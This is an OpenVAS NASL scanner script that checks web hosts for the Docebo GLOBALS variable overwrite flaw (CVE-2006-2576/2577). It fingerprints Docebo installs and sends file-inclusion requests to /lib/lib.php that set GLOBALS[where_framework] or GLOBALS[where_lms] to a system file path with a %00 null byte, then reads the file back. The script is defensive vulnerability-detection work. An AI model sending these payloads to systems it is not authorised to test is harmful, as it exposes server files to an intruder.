# OpenVAS Vulnerability Test
# $Id: docebo_globals_overwrite.nasl 13543 2019-02-08 14:43:51Z cfischer $
# Description: Docebo GLOBALS Variable Overwrite Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Original advisory / discovered by :
# http://milw0rm.com/exploits/1817

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200011");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2576", "CVE-2006-2577");
  script_bugtraq_id(18109);
  script_name("Docebo GLOBALS Variable Overwrite Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");

  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Disable PHP's register_globals and/or upgrade to a newer PHP release.");
  script_tag(name:"summary", value:"The remote host contains a PHP application that is vulnerable
to remote and local file inclusions.

Description :

At least one Docebo application is installed on the system.

Docebo has multiple PHP based applications, including a content
management system (DoceboCMS), a e-learning platform
(DoceboLMS) and a knowledge maintenance system (DoceboKMS)

By using a flaw in some PHP versions (PHP4 <= 4.4.0 and PHP5 <= 5.0.5)
it is possible to include files by overwriting the $GLOBALS variable.

This flaw exists if PHP's register_globals is enabled.");
  script_xref(name:"URL", value:"http://secunia.com/advisories/20260/");
  script_xref(name:"URL", value:"http://www.hardened-php.net/advisory_202005.79.html");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

success = FALSE;

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/doceboLms", "/doceboKms", "/doceboCms", "/doceboCore", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/index.php"), port:port);

  if (egrep(pattern:"^Set-Cookie:.+docebo_session=", string:res) ||
      egrep(pattern:'title="Powered by Docebo(KMS|LMS|CMS)"', string:res) ||
      egrep(pattern:"powered_by.+<a href[^/]+\/\/www\.docebo\.org", string:res)) {

    foreach pattern(keys(files)) {

      uri = "/lib/lib.php";
      globals[0] = "GLOBALS[where_framework]=";
      globals[1] = "GLOBALS[where_lms]=";
      lfile = "/" + files[pattern];

      for(n = 0; globals[n]; n++) {
        req = http_get(item:string(dir, uri, "?", globals[n], lfile, "%00"), port:port);
        recv = http_keepalive_send_recv(data:req, port:port, bodyonly:1);

        if (egrep(pattern:pattern, string:recv)) {
          n++;
          success = TRUE;
          path += string("http://", get_host_name(),  dir, "\n");
        }
      }
    }
  }
}

if (success) {
  report = string("Below the full path to the vulnerable Docebo application(s):\n\n", path);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);